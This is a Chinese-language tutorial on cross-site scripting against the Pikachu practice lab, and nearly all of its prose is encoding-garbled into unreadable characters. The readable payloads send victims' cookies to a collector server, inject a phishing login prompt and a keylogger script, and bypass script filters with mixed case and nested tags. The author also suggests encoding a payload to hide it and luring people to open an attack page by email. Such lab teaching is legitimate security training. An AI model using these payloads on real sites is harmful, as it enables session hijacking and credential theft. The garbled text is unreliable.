ä¹æ²¡æœ‰ä»€ä¹ˆç”¨ã€‚ä¸€èˆ¬åœ¨å„ç±»çš„ç¤¾äº¤å¹³å°ï¼Œé‚®ä»¶ç³»ç»Ÿï¼Œå¼€æºæµè¡Œçš„Webåº”ç”¨ï¼ŒBBSï¼Œå¾®åšç­‰åœºæ™¯ä¸­ï¼Œé€ æˆçš„æ€ä¼¤åŠ›å´ååˆ†å¼ºå¤§ã€‚ 2ã€åŠ«æŒç”¨æˆ·cookieæ˜¯æœ€å¸¸è§çš„è·¨ç«™æ”»å‡»å½¢å¼ï¼Œé€šè¿‡åœ¨ç½‘é¡µä¸­å†™å…¥å¹¶æ‰§è¡Œè„šæœ¬æ‰§è¡Œæ–‡ä»¶ï¼ˆå¤šæ•°æƒ…å†µä¸‹æ˜¯JavaScriptè„šæœ¬ä»£ç ï¼‰ï¼ŒåŠ«æŒç”¨æˆ·æµè§ˆå™¨ï¼Œå°†ç”¨æˆ·å½“å‰ä½¿ç”¨çš„sessionIDä¿¡æ¯å‘é€è‡³æ”»å‡»è€…æ§åˆ¶çš„ç½‘ç«™æˆ–æœåŠ¡å™¨ä¸­ã€‚ 3ã€â€æ¡†æ¶é’“é±¼â€ã€‚åˆ©ç”¨JSè„šæœ¬çš„åŸºæœ¬åŠŸèƒ½ä¹‹ä¸€ï¼šæ“ä½œç½‘é¡µä¸­çš„DOMæ ‘ç»“æ„å’Œå†…å®¹ï¼Œåœ¨ç½‘é¡µä¸­é€šè¿‡JSè„šæœ¬ï¼Œç”Ÿæˆè™šå‡çš„é¡µé¢ï¼Œæ¬ºéª—ç”¨æˆ·æ‰§è¡Œæ“ä½œï¼Œè€Œç”¨æˆ·æ‰€æœ‰çš„è¾“å…¥å†…å®¹éƒ½ä¼šè¢«å‘é€åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ä¸Šã€‚ 4ã€æŒ‚é©¬ï¼ˆæ°´å‘æ”»å‡»ï¼‰ 5ã€æœ‰å±€é™æ€§çš„é”®ç›˜è®°å½• 9-3-4 xssçš„åˆ†ç±»## åå°„å‹ï¼š## ä¸æœåŠ¡ç«¯äº¤äº’ï¼Œä½†æ˜¯äº¤äº’çš„æ•°æ®ä¸€èˆ¬ä¸ä¼šè¢«å­˜åœ¨æ•°æ®åº“ä¸­ï¼Œä¸€æ¬¡æ€§ï¼Œæ‰€è§å³æ‰€å¾—ï¼Œä¸€èˆ¬å‡ºç°åœ¨æŸ¥è¯¢ç±»é¡µé¢ç­‰ã€‚## å­˜å‚¨å‹ï¼š## äº¤äº’çš„æ•°æ®ä¼šè¢«å­˜åœ¨æ•°æ®åº“ä¸­ï¼Œæ°¸ä¹…æ€§å­˜å‚¨ï¼Œä¸€èˆ¬å‡ºç°åœ¨ç•™è¨€æ¿ï¼Œæ³¨å†Œç­‰é¡µé¢ã€‚## DOMå‹ï¼š## ä¸ä¸åå°æœåŠ¡å™¨äº§ç”Ÿæ•°æ®äº¤äº’ï¼Œæ˜¯ä¸€ç§é€šè¿‡DOMæ“ä½œå‰ç«¯ä»£ç è¾“å‡ºçš„æ—¶å€™äº§ç”Ÿçš„æ¼æ´ï¼Œå¤§éƒ¨åˆ†å±äºåå°„å‹ï¼Œå°‘éƒ¨åˆ†å±äºå­˜å‚¨å‹ã€‚## å…³äºéæŒä¹…å‹ï¼ŒæŒä¹…å‹ï¼ŒDomå‹xss## éæŒä¹…å‹xssæ”»å‡»ï¼šé¡¾åæ€ä¹‰ï¼ŒéæŒä¹…å‹xssæ”»å‡»æ˜¯ä¸€æ¬¡æ€§çš„ï¼Œä»…å¯¹å½“æ¬¡çš„é¡µé¢è®¿é—®äº§ç”Ÿå½±å“ã€‚éæŒä¹…å‹xssæ”»å‡»è¦æ±‚ç”¨æˆ·è®¿é—®ä¸€ä¸ªè¢«æ”»å‡»è€…ç¯¡æ”¹åçš„é“¾æ¥ï¼Œç”¨æˆ·è®¿é—®è¯¥é“¾æ¥æ—¶ï¼Œè¢«æ¤å…¥çš„æ”»å‡»è„šæœ¬è¢«ç”¨æˆ·æ¸¸è§ˆå™¨æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ”»å‡»ç›®çš„ã€‚## æŒä¹…å‹xssæ”»å‡»ï¼šæŒä¹…å‹xssï¼Œä¼šæŠŠæ”»å‡»è€…çš„æ•°æ®å­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯ï¼Œæ”»å‡»è¡Œä¸ºå°†ä¼´éšç€æ”»å‡»æ•°æ®ä¸€ç›´å­˜åœ¨ã€‚è€ŒDomå‹xsså±äºæœ‰å¯èƒ½æ˜¯æŒä¹…ä¹Ÿå¯èƒ½æ˜¯éæŒä¹…å‹ã€‚ 4-1 åå°„å‹XSSæˆ–ä¸æŒä¹…å‹XSS(ä¸­ä½å±)äº¤äº’çš„æ•°æ®ä¸€èˆ¬ä¸ä¼šè¢«å­˜åœ¨åœ¨æ•°æ®åº“é‡Œé¢,åªæ˜¯ç®€å•çš„æŠŠç”¨æˆ·è¾“å…¥çš„æ•°æ®åå°„ç»™æµè§ˆå™¨ï¼Œä¸€æ¬¡æ€§ï¼Œæ‰€è§å³æ‰€å¾—ã€‚ ?php $name = $_GET[name]; echo Welcome $namebr;? ç¤ºä¾‹ï¼šæ¯”å¦‚æˆ‘ä»¬å°†ä¸Šé¢çš„ä»£ç æ”¾åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œæ¯”å¦‚æ–‡ä»¶åç§°ä¸ºxss.phpï¼Œç„¶åå°†æ–‡ä»¶æ”¾å…¥åˆ°æˆ‘ä»¬çš„phpstudyçš„ç½‘ç«™ç›®å½•ä¸­å» è®¿é—®ä¸€ä¸‹çœ‹çœ‹æ•ˆæœï¼Œ http://192.168.0.15/xss.php?name=1 ï¼Œè¿™ä¸ªä»£ç å¾ˆæ˜æ˜¾æ²¡æœ‰æ•°æ®åº“æ³¨å…¥æ¼æ´ï¼Œä½†æ˜¯å­˜åœ¨xssæ¼æ´ï¼Œå› ä¸ºè¿™æ®µä»£ç å¹¶æ²¡æœ‰å¯¹ç”¨æˆ·çš„å‚æ•°æ•°æ®è¿›è¡Œè¿‡æ»¤å¤„ç†ã€‚ æ”»å‡»æ–¹æ³• â€˜â€œ ï¼Œå…¶ä¸­ â€˜â€œ æˆ‘ä»¬ç§°ä¹‹ä¸ºå®Œæˆé—­åˆç¬¦å·ï¼Œåé¢è·Ÿscriptæ ‡ç­¾ æ¥è¿›è¡Œæ”»å‡»ï¼Œå¼¹å‡ºäº†çª—å£è¡¨ç¤ºæˆ‘ä»¬çš„jsä»£ç è¢«æ‰§è¡Œäº†ã€‚ å¹¶ä¸”æˆ‘ä»¬è¿™ç§å¼¹æ¡†çš„ä»£ç æ˜¯æ²¡æœ‰ä»€ä¹ˆå¤ªå¤§çš„æ”»å‡»æ€§çš„ï¼Œæ‰€ä»¥å¯ä»¥ä½œä¸ºæˆ‘ä»¬è¿›è¡Œxssçš„æ¼æ´æµ‹è¯•ã€‚å…¶å®å¯¹äºåˆçº§æŒ–æ´çš„äººæ¥è¯´ï¼Œè¿™ä¸ªä»£ç å°±å¤Ÿäº†ï¼Œä½†æ˜¯å¦‚æœä½œä¸ºæ”»é˜²ä¸­çš„çº¢æ–¹çš„è¯ï¼Œä½ è¿˜éœ€è¦å¾€ä¸‹å­¦ä¹ æ›´å¤šçš„æ‰‹æ®µã€‚ å…¶å®xssçš„ä»£ç æ‰‹æ®µéå¸¸å¤šï¼Œå› ä¸ºåˆ«äººå¯èƒ½é€šè¿‡è¿‡æ»¤ç­‰æ‰‹æ®µå¯¹scriptæ ‡ç­¾åšäº†é™åˆ¶ï¼Œé‚£ä¹ˆä½ æƒ³æ”»å‡»çš„è¯ï¼Œå°±è¦æ”¹å˜æ–¹å¼ï¼Œæ‰€ä»¥æ”»å‡»ä»£ç çš„å†™æ³•éå¸¸å¤šã€‚ åœ¨çœ‹pikachuç½‘ç«™ï¼š â€˜â€œ æ•ˆæœï¼šå‡ºç°äº†å¼¹æ¡†ï¼Œä½†æ˜¯åœ¨urlä¸Šæ˜¾ç¤ºå‡ºäº†ä¸€äº›scriptæ ‡ç­¾å†…å®¹ï¼Œå…¶å®åˆ«äººä¸€çœ‹æ¯”è¾ƒå®¹æ˜“åˆ¤æ–­è¿™æ˜¯é—®é¢˜ï¼Œæ‰€ä»¥å…¶å®æ”»å‡»æ€§ä¸å¼º 4-2 å‚¨å­˜å‹XSSæˆ–æŒä¹…å‹XSSï¼ˆé«˜å±ï¼‰äº¤äº’çš„æ•°æ®ä¼šè¢«å­˜åœ¨åœ¨æ•°æ®åº“é‡Œé¢,æ°¸ä¹…æ€§å­˜å‚¨,å…·æœ‰å¾ˆå¼ºçš„ç¨³å®šæ€§ã€‚ ç¤ºä¾‹ï¼š â€˜â€œ ä¸‹æ¬¡å†æ¥è®¿é—®è¿™ä¸ªé¡µé¢ï¼š è¯´æ˜ï¼Œè¿™ä¸ªæ”»å‡»ä»£ç å­˜å‚¨åˆ°äº†æ•°æ®åº“é‡Œé¢ï¼Œæ¯æ¬¡åˆ·æ–°é¡µé¢çš„æ—¶å€™ï¼Œéƒ½ä¼šåŠ è½½è¿™ä¸ªæ•°æ®ï¼Œæ‰§è¡Œè¿™ä¸ªjsä»£ç ï¼Œæ‰€ä»¥è¿™ç§å­˜å‚¨å‹æ¼æ´å¾ˆä¸¥é‡ã€‚ 4-3 DOM XSS(ä¸­ä½å±)é€šè¿‡å‰ç«¯çš„domèŠ‚ç‚¹å½¢æˆçš„XSSæ¼æ´ï¼Œä¸€èˆ¬ä¸ä¸åå°æœåŠ¡å™¨äº§ç”Ÿæ•°æ®äº¤äº’ï¼Œå±äºä¸­ä½å±æ¼æ´äº†ã€‚ å¯èƒ½è§¦å‘DOMå‹XSSçš„jsæ“ä½œ document.refererwindow.namelocationinnerHTMLdocument.write é—­åˆæ ‡ç­¾ï¼š onclick=alert(1111) onclick=alert(xss)img src=# onmouseover=alert(xss)a href=/ascriptalert(1);/scriptwhat do you see?/a ç¤ºä¾‹ï¼š xx onclick=alert(123) ä½†æˆ‘ä»¬ç‚¹å‡»aæ ‡ç­¾çš„æ–‡å­—æ—¶ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š 9-3-5 å®æˆ˜5-1 ç›—å–cookieè¿‡ç¨‹ï¼šæƒ³è¦ç›—å–åˆ«äººçš„cookieä¿¡æ¯çš„è¯æœ‰ä¸€ä¸ªå‰ææ¡ä»¶ï¼Œå°±æ˜¯ä½ åº”è¯¥åœ¨åˆ«äººè§¦å‘ä½ çš„xssæ”»å‡»æ—¶ï¼Œä½ çš„ä»£ç åº”è¯¥å°†æ”¶é›†çš„cookieä¿¡æ¯å‘é€ç»™ä½ çš„å¹³å°æ¥æ¥æ”¶ï¼Œè¿™æ ·æ‰è·å–åˆ°äº†æ•°æ® scriptdocument.location = http://192.168.0.15/pikachu/pkxss/xcookie/cookie.php?cookie= + document.cookie;/script//é€šè¿‡document.location å®ä¾‹è¿›è¡Œé‡å®šå‘åˆ°http://http://192.168.0.15/pikachu/pkxss/xcookie/cookie.php?cookie= 1.å®‰è£…xssåå° 2.å®‰è£… 3.åˆå§‹åŒ– 4.åˆå§‹åŒ–å®Œæˆï¼Œè¿›å…¥é¦–é¡µ 5.é¦–é¡µç™»å½• 6.ç™»å½•æˆåŠŸä¹‹åçš„é¡µé¢æ•ˆæœï¼š 7.ç‚¹å‡»cookieæ”¶é›†ï¼Œæ¥åˆ°å¦‚ä¸‹é¡µé¢è¿›è¡Œç­‰å¾…ï¼Œç­‰å¾…æ”¶å–ä½ æ”»å‡»è·å¾—çš„æ•°æ® http://192.168.31.110/pikachu/vul/xss/xss_stored.php 8.å…³é—­phpstudyçš„é­”æ³•ç¬¦å· 9.å›åˆ°æˆ‘ä»¬çš„pikachué¡µé¢ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹åˆ°æœ‰xssæ”»å‡»çš„ç‚¹ 10.æ³¨å…¥xssæ”»å‡»ä»£ç  scriptdocument.location =http://192.168.0.15/pikachu/pkxss/xcookie/cookie.php?cookie= + document.cookie;/script // æœ€å¥½å¯¹è¿™ä¸ªä»£ç ç¼–ç ä¸€ä¸‹ï¼Œè®©åˆ«äººä¸é‚£ä¹ˆå®¹æ˜“çœ‹å‡ºæ¥ï¼Œé‚£ä¹ˆè¿™æ®µä»£ç çš„æ„æ€æ˜¯å°†è·å–åˆ°çš„cookieï¼Œå‘é€ç»™è¿™ä¸ªç½‘å€çš„æ–‡ä»¶ /pikachu/pkxss/xcookie/cookie.php è¿™ä¸ªæ–‡ä»¶å°†cookieæ•°æ®ä¿å­˜åˆ°äº†xxsåå°ç³»ç»Ÿçš„æ•°æ®åº“ä¸­ï¼Œæˆ‘ä»¬å°±èƒ½åœ¨åå°çœ‹åˆ°è·å–çš„cookieæ•°æ®äº†ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶ï¼Œæ³¨æ„headerå‡½æ•°ä¸­çš„ipåœ°å€è¦æ”¹æˆæˆ‘ä»¬è‡ªå·±çš„pikachué¡¹ç›®æ‰€åœ¨æœåŠ¡å™¨çš„ipåœ°å€æ˜‚ã€‚è¿™ä¸ªheaderè·³è½¬ä¹Ÿæ˜¯ä¸ºäº†ä¸è®©å¯¹æ–¹åœ¨ç½‘å€ä¸Šçœ‹åˆ°ä½ çš„xssä»£ç ï¼Œè¿·æƒ‘å¯¹æ–¹ç”¨çš„ã€‚ 11.æ³¨å…¥xssä»£ç ï¼Œç„¶åè®¿é—®ï¼Œæ³¨æ„ï¼Œå¦‚æœåˆ«äººæ·»åŠ cookieçš„æ—¶å€™ï¼Œç»™set_cookieæ–¹æ³•è®¾ç½®äº†é‚£ä¸ªhttponlyTrueå‚æ•°çš„è¯ï¼Œæ˜¯ä¸èƒ½å®Œæˆè¿™ä¸ªæ”»å‡»çš„ï¼Œå› ä¸ºæœ‰äº†è¿™ä¸ªå‚æ•°ï¼Œé‚£ä¹ˆjsä»£ç å°±ä¸èƒ½è·å–cookieäº†ï¼Œä½†æ˜¯å®ƒåªé’ˆå¯¹jsç”Ÿæ•ˆï¼Œä»€ä¹ˆvscriptç­‰å‰ç«¯è¯­è¨€æ˜¯ä¸å—è¿™ä¸ªå‚æ•°é™åˆ¶çš„ 13.çœ‹xssåå° 12.å¦‚æœæ•ˆæœä¸å¥½çš„è¯ï¼Œåˆ‡æ¢ä¸€ä¸‹ç‰ˆæœ¬ 5-2 åå°„å‹XSS(POST)è·å–cookiepostè¯·æ±‚æ–¹å¼çš„xssæ”»å‡»å…¶å®æ˜¯æ¯”è¾ƒéš¾å®ç°çš„ï¼Œå› ä¸ºè¦æ„é€ ä¸€ä¸ªç½‘é¡µhtmlæ–‡ä»¶å‡ºæ¥ postæ”»å‡»åˆ©ç”¨é¡µé¢ D:\\phpStudy\\WWW\\pikachu\\pkxss\\xcookie\\post.htmlhttp://192.16816.223:90/post.html ç¤ºä¾‹ï¼š æ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶ å°†é‡Œé¢çš„ipåœ°å€å’Œè·¯å¾„æ”¹ä¸ºè¿™ä¸ªè™šæ‹Ÿæœºçš„ipåœ°å€å’Œxssåå°è·¯å¾„ï¼šè¿™ä¸ªæ–‡ä»¶æˆ‘ä»¬åé¢æƒ³åŠæ³•å¼•å¯¼åˆ«äººæ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œå½“ä»–æ‰“å¼€è¿™ä¸ªæ–‡ä»¶çš„æ—¶å€™ï¼Œå°±æŠŠä»–çš„cookieä¿¡æ¯å‘é€åˆ°äº†æˆ‘ä»¬çš„xssåå°ã€‚ æ‰¾åˆ°pikachuï¼Œè¾“å…¥ç”¨æˆ·åå’Œå¯†ç ç™»å½•è¿™é‡Œï¼Œadmin123456ï¼Œä»¥åæˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªæ–‡ä»¶ä»¥é‚®ä»¶çš„å½¢å¼æˆ–è€…ç½‘ç«™é¡µé¢åµŒå…¥çš„å½¢å¼è¯±å¯¼åˆ«äººæ‰“å¼€è¿™ä¸ªæ–‡ä»¶ã€‚æˆ‘ä»¬å°†è¿™ä¸ªæ–‡ä»¶ä¿å­˜åˆ°æˆ‘ä»¬çš„ç‰©ç†æœºä¸Šï¼Œé€šè¿‡è°·æ­Œæµè§ˆå™¨å°±èƒ½ç©ã€‚ ç™»å½•æˆåŠŸæ•ˆæœï¼š ç„¶åç›´æ¥åŒå‡»æ‰“å¼€æˆ‘ä»¬çš„post.html æ‰“å¼€æ•ˆæœï¼šç›´æ¥è·³è½¬åˆ°äº†å¦‚ä¸‹é¡µé¢ ç„¶åçœ‹æˆ‘ä»¬xssåå°çš„cookieä¿¡æ¯ æ‹¿åˆ°äº†ç”¨æˆ·çš„cookieä¿¡æ¯ã€‚ æˆ‘ä»¬é€šè¿‡è¿™ä¸ªç”¨æˆ·çš„cookieå°±èƒ½ç™»å½•ç½‘ç«™ï¼Œå¦‚ä¸‹ï¼šæˆ‘ä»¬é€šè¿‡æŠ“åŒ…ï¼Œåœ¨æ‰“å¼€å¦å¤–ä¸€ä¸ªæµè§ˆå™¨ï¼Œæ¯”å¦‚ç«ç‹ï¼Œé€šè¿‡è·å–æ¥è®¿é—®ä¸€ä¸‹è¿™ä¸ªç™»å½•é¡µé¢ï¼Œåº”è¯¥ä¼šæç¤ºä½ è®©ä½ è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨ç™»å½•æˆåŠŸçš„chormeä¸Šåˆ·æ–°ä¸€ä¸‹é¡µé¢ï¼ŒæŠ“ä¸€ä¸ªåŒ…ï¼Œç„¶ååœ¨ç«ç‹ä¸ŠæŠ“ä¸€ä¸ªåŒ…ï¼Œå°†chormeçš„åŒ…æ›¿æ¢åˆ°ç«ç‹çš„è¯·æ±‚åŒ…é‡Œé¢å»ï¼Œå½“ä½ å†æ”¾åŒ…ï¼Œä½ ä¼šå‘ç°ï¼Œä½ åœ¨ç«ç‹ä¸Šç›´æ¥å°±å¤„äºç™»å½•çŠ¶æ€äº†ã€‚ å…¶å®è¿™ä¸ªåå°„å‹ä¸»è¦æ˜¯åšé»‘äº§çš„æ—¶å€™ç”¨åˆ°çš„å¤šï¼Œæˆ‘ä»¬æµ‹è¯•xssæ”»å‡»ç‚¹çš„æ—¶å€™ï¼Œå°±å¼¹æ¡†å°±å¯ä»¥äº†ã€‚æœ‰äº›æé»‘äº§çš„åšçš„å¼¹æ¡†å¯èƒ½æ˜¯æç¤ºä½ ï¼Œflashå•Šä»€ä¹ˆçš„ç‰ˆæœ¬è¿‡ä½ï¼Œç‚¹å‡»ä¸‹è½½æ›´æ–°ï¼Œå½“ä½ ç‚¹å‡»ä¸‹è½½ï¼Œä¸‹è½½æ¥çš„å¯èƒ½å°±æ˜¯æœ¨é©¬ã€‚æˆ–è€…æœ¨é©¬ç»‘å®šåœ¨flashé‡Œé¢äº†ï¼Œæˆ–è€…ç›—å–ä½ çš„ä¸ªäººä¿¡æ¯ç­‰ã€‚æ³¨æ„ä¸€ç‚¹ï¼Œæ¯æµ‹è¯•ä¸€æ¬¡å°±æ¸…ç©ºä¸€ä¸‹æµè§ˆå™¨çš„cookieï¼Œä¸ç„¶ä¸‹æ¬¡å†å°è¯•å°±ä¸å®¹æ˜“çœ‹åˆ°æ•ˆæœäº†ã€‚ 5-3 xssé’“é±¼æ¼”ç¤ºé’“é±¼çš„æ–¹æ³•æœ‰å¾ˆå¤šï¼Œä½†æ˜¯è¿™ä¸ªä¸»è¦æ˜¯çœ‹ä½ çš„é¡µé¢æ­å»ºçš„å¥½ä¸å¥½ï¼Œæ˜¯ä¸æ˜¯å’Œåˆ«äººæ­£å¸¸ç½‘ç«™é¡µé¢çš„å¾ˆä¸€æ ·ï¼Œèƒ½ä¸èƒ½éª—åˆ°åˆ«äººï¼Œæˆ‘ä»¬ä¸èƒ½åšè¿™ä¸ªæ˜‚ï¼Œè¿æ³•çš„ã€‚ åªè¦æœ‰xssæ¼æ´çš„åœ°æ–¹ï¼Œéƒ½å¯ä»¥åšé’“é±¼ã€‚ é’“é±¼æ”»å‡»åˆ©ç”¨é¡µé¢ D:\\phpStudy\\WWW\\pikachu\\pkxss\\xfish script src=http://192.168.1.12/pikachu/pkxss/xfish/fish.php/script ç¤ºä¾‹ï¼šè¿™æ¬¡æˆ‘ä»¬é€šè¿‡pikachuçš„å­˜å‚¨å‹æ¥åšå®éªŒ æˆ‘ä»¬æ‰“å¼€pikachuç»™æˆ‘ä»¬å‡†å¤‡å¥½çš„é’“é±¼é¡µé¢ï¼Œæ³¨æ„å°†ä»£ç ä¸­çš„IPåœ°å€æ”¹ä¸ºæˆ‘ä»¬è‡ªå·±çš„IPåœ°å€æ˜‚ã€‚ è¿™æ®µä»£ç å°±æ˜¯å¼¹å‡ºä¸€ä¸ªå¯¹è¯æ¡†ï¼Œç„¶åå°†ç”¨æˆ·åœ¨å¯¹è¯æ¡†ä¸­è¾“å…¥çš„ç”¨æˆ·åå’Œå¯†ç å‘é€åˆ°xfish.phpæ–‡ä»¶ä¸­ï¼Œè¿™ä¸ªæ–‡ä»¶åšçš„äº‹æƒ…å°±æ˜¯å°†æ•°æ®ä¿å­˜åˆ°æ•°æ®åº“ä¸­ã€‚ æ‰“å¼€pikachuçš„å­˜å‚¨å‹ä½ç½®ï¼Œå°†ä»£ç æ”¾è¿›å…¥ script src=http://192.168.1.12/pikachu/pkxss/xfish/fish.php/script è¾“å…¥jadenã€123ï¼Œç„¶åç‚¹å‡»ç™»å½•ï¼Œç„¶åå›åˆ°é’“é±¼ç»“æœé¡µé¢ è¿˜æœ‰å¾ˆä¼šåœ¨åˆ«äººç½‘ç«™ç™»å½•çš„é¡µé¢ä¸­å‘ç°äº†xssæ¼æ´ï¼Œæ¯”å¦‚ä¸‹é¢çš„ å½“ä½ è¾“å…¥äº†ç”¨æˆ·ä¿¡æ¯ä¹‹åï¼Œç‚¹å‡»ç™»å½•ï¼Œç»“æœå•Šï¼Œæç¤ºä½ ç™»å½•è¶…æ—¶è¯·é‡æ–°ç™»å½•ç­‰æ•ˆæœï¼Œç„¶åä½ æœ‰è¾“å…¥äº†ä¸€éç”¨æˆ·åå’Œå¯†ç ï¼Œåœ¨ç‚¹å‡»ç™»å½•çš„æ—¶å€™ï¼Œä½ çš„ç”¨æˆ·ä¿¡æ¯å°±è¢«æ‹¿èµ°äº†ï¼Œç¬¬äºŒæ¬¡æç¤ºä½ è¾“å…¥ç”¨æˆ·åå¯†ç çš„æ—¶å€™ï¼Œä½ è¦æ³¨æ„è§‚å¯Ÿç½‘ç«™çš„ç½‘ç«™æ˜¯å¦å˜åŒ–äº†ï¼Œçœ‹ä¸Šå»å¾ˆè¯¡å¼‚çš„ï¼Œç¼–ç è¿‡çš„ï¼Œé‚£ä¹ˆå°±ä¸è¦è¾“å…¥äº†ï¼Œå› ä¸ºè¿™æ˜¯åˆ«äººåšçš„å’Œæ­£å¸¸ç½‘ç«™ä¸€æ ·é¡µé¢æ•ˆæœçš„é’“é±¼ç½‘ç«™ç™»å½•é¡µé¢ï¼Œä»¥å‰qqè´¦å·å¯†ç å°±è¿™ä¹ˆä¸¢çš„ã€‚ 5-4 xssè·å–é”®ç›˜è®°å½•æ¼”ç¤ºjsçš„è¿™ä¸ªç›‘æ§é”®ç›˜å°±çš„jsæ–‡ä»¶åŠŸèƒ½ä¸å¤ªå¥½æ˜‚ï¼Œç®€ç­”æ¼”ç¤ºä¸€ä¸‹ script src=http://192.168.0.15/pikachu/pkxss/rkeypress/rk.js/script æ‰“å¼€ä¸‹é¢çš„æ–‡ä»¶ï¼Œä¿®æ”¹ä¸€ä¸‹ipåœ°å€å’Œè·¯å¾„ï¼š æ‰“å¼€pikachu ç„¶ååœ¨é¡µé¢ä¸Šéšä¾¿æ•²ä¸€æ•²é”®ç›˜ï¼Œæ³¨æ„åªèƒ½è®°å½•è¿™ä¸ªé’“é±¼çš„é¡µé¢å®ç°é”®ç›˜è®°å½•æ˜‚ï¼Œæ¯”å¦‚æˆ‘æ•²äº†888888ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š 5-5 XSSç›²æ‰“XSSç›²æ‰“å°±æ˜¯æ”»å‡»è€…åœ¨å‰ç«¯æäº¤çš„æ•°æ®ä¸çŸ¥é“åå°æ˜¯å¦å­˜åœ¨xssæ¼æ´çš„æƒ…å†µä¸‹ï¼Œæäº¤æ¶æ„JSä»£ç åœ¨ç±»ä¼¼ç•™è¨€æ¿ç­‰è¾“å…¥æ¡†åï¼Œæ‰€å±•ç°çš„åå°ä½ç½®çš„æƒ…å†µä¸‹ï¼Œç½‘ç«™é‡‡ç”¨äº†æ”»å‡»è€…æ’å…¥çš„æ¶æ„ä»£ç ï¼Œå½“åå°ç®¡ç†å‘˜åœ¨æ“ä½œæ—¶å°±ä¼šè§¦å‘æ’å…¥çš„æ¶æ„ä»£ç ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»è€…çš„ç›®çš„ã€‚ä¹Ÿå°±æ˜¯é€šè¿‡å‰ç«¯æ’å…¥æ”»å‡»ä»£ç ï¼Œåœ¨åå°ç®¡ç†ç³»ç»Ÿä¸­ç”Ÿæ•ˆã€‚ ç®¡ç†å‘˜åå°ï¼š http://192.168.0.15/pikachu/vul/xss/xssblind/admin_login.php ç‚¹å‡»æäº¤ä¹‹åï¼Œæ²¡æœ‰ä»»ä½•å¼¹æ¡†æ•ˆæœï¼Œä¸çŸ¥é“å®ƒæœ‰æ²¡æœ‰xssæ¼æ´ï¼Œå› ä¸ºæ•°æ®æäº¤åˆ°äº†åå°ï¼Œæˆ‘ä»¬åœ¨å‰ç«¯æ²¡æœ‰çœ‹åˆ°æˆ‘ä»¬æäº¤çš„ä»»ä½•æ•°æ®ã€‚ è¿™é‡Œæœ‰æç¤ºåå°ç½‘å€æ˜‚ è¿›å…¥åå°çœ‹ä¸€ä¸‹ï¼š ç‚¹å‡»ç™»å½•ä¹‹åçš„æ•ˆæœï¼š é‚£ä¹ˆè¿™é‡Œæˆ‘å¦‚æœæ’å…¥çš„é’“é±¼ä»£ç ï¼Œå¼¹æ¡†æ•ˆæœæ›´åŠ å¥½çœ‹ä¸€äº›ï¼Œæç¤ºé‡æ–°ç™»é™†ç­‰æ–‡å­—ï¼Œé‚£ä¹ˆå¾ˆæœ‰å¯èƒ½å°±èƒ½è·å–åˆ°ä½ çš„åå°è´¦å·å¯†ç ã€‚ 5-6 XSSç»•è¿‡ï¼ˆ1ï¼‰å¯¹å‰ç«¯çš„é™åˆ¶å¯ä»¥å°è¯•è¿›è¡ŒæŠ“åŒ…é‡å‘æˆ–è€…ä¿®æ”¹å‰ç«¯çš„HTMLã€‚æ¯”å¦‚å‰é¢çš„ç¤ºä¾‹ä¸­è¾“å…¥æ¡†é™åˆ¶åªèƒ½è¾“å…¥20ä¸ªå­—ç¬¦çš„é‚£ä¸ªï¼Œè¿™å°±æ˜¯é™åˆ¶ï¼Œä½†æ˜¯å‰ç«¯çš„é™åˆ¶å¯¹èƒ½åŠ›å¼ºçš„æ”»å‡»è€…æ¥è®²éƒ½æ˜¯æ— ç”¨çš„ã€‚æŠ“åŒ…æ”¹è¯·æ±‚åŒ…ï¼Œæˆ–è€…ç›´æ¥åœ¨å‰ç«¯ä»£ç ä¸­ä¿®æ”¹ç­‰ã€‚ ï¼ˆ2ï¼‰é˜²æ­¢åå°å¯¹è¾“å…¥çš„å†…å®¹è¿›è¡Œæ­£åˆ™åŒ¹é…æ¥è¿‡æ»¤è¾“å…¥ï¼Œå¯¹äºè¿™æ ·çš„è¿‡æ»¤å¯ä»¥è€ƒè™‘å¤§å°å†™æ··åˆè¾“å…¥çš„æ–¹æ³•ã€‚æ¯”å¦‚æˆ‘ä»¬çœ‹çœ‹ä»£ç æ–‡ä»¶ æ¯”å¦‚æ‰“å¼€xss_01.phpçœ‹çœ‹é‡Œé¢çš„ä»£ç ï¼Œå¯¹scriptå­—æ¯è¿›è¡Œäº†æ›¿æ¢ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½æŠŠæˆ‘ä»¬çš„scriptæ ‡ç­¾æ”¹ä¸ºå¤§å†™çš„å½¢å¼SCRIPT //å†çœ‹pikachuï¼Œ scriptalert(è¿‡ä¸å»å•¦ï¼)/script// è¢«è¿‡æ»¤äº†ï¼šæ²¡æœ‰å¼¹æ¡†æ•ˆæœï¼Œ // ç»•è¿‡ï¼š sCRipTalert(ä½ æ‰“ç¯®çƒåƒjaden)/sCrIPt æˆ–è€…åˆ«äººä¸ç”¨scriptæ ‡ç­¾ï¼Œç”¨ä»€ä¹ˆimgã€iframeæ ‡ç­¾ä¹‹ç±»çš„ã€‚\\ img src=# onerror=alert(jaden)/ ï¼ˆ3ï¼‰é˜²æ­¢åå°å¯¹è¾“å…¥çš„å†…å®¹è¿›è¡Œæ›¿æ¢ï¼Œé‡‡ç”¨æ‹¼æ‹¼å‡‘çš„è¾“å…¥æ–¹æ³•ã€‚ è¿™ä¸ªå°±æ˜¯è¯´ï¼Œåˆ«äººåœ¨åå°ä»£ç ä¸­ç›´æ¥å°†æäº¤è¿‡æ¥çš„æ•°æ®ä¸­çš„ ä¾‹ï¼šscscriptriptalert(ä½ æ‰“ç¯®çƒåƒjaden)/scrscriptipt 5-7 XSSç»•è¿‡ä¹‹htmlspecialchars()å‡½æ•°phpé‡Œé¢çš„è¿™ä¸ªhtmlspecialchars()å‡½æ•°æŠŠä¸€äº›é¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸º HTML 